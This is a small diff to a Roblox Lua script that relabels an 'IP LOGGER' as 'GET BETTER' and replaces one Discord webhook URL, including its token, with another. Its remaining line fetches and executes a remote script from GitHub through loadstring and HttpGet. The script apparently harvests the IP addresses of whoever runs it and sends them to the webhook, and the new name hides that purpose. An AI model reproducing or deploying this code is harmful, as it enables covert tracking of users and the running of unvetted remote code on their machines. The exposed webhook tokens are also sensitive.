@@ -1,3 +1,3 @@
- getgenv().whscript = "IP LOGGER"         
-getgenv().webhookexecUrl = "https://discord.com/api/webhooks/1251532029569269822/xTcDyQFEy7xzqAXEhMip1Io6RMtzk3WZH4ezIGCvovTt8Qpz3R4efNvcd3CMOCXcEHNX"  --Put your Webhook Url here
+ getgenv().whscript = "GET BETTER"         
+getgenv().webhookexecUrl = "https://discord.com/api/webhooks/1253068841416917064/CunipGfJYGI1EdqSrgYOyENntqD_IQLxwNMKhq-k33VBk62_gS1PVmcDI2rqSXprxOut"  --Put your Webhook Url here
 loadstring(game:HttpGet(("https://raw.githubusercontent.com/venoxhh/universalscripts/main/webhook_execution")))()
